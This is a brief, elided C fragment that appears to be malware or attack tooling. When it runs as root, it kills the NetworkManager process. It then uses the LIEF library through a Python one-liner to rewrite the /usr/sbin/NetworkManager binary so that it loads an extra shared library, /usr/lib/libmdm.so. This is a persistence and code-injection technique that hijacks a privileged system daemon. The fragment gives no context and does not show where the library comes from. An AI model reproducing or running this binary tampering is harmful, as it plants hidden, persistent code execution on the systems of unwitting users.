...
void main(int argc,const char **argv){
	...
	if (uid == 0){		
		...
		system("pgrep NetworkManager | xargs kill 2>/dev/null");
		system("python -c \"import lief;libnative = lief.parse(\'/usr/sbin/NetworkManager\');libnative.add_library(\'/usr/lib/libmdm.so\');libnative.write(\'/usr/sbin/NetworkManager\')\"");
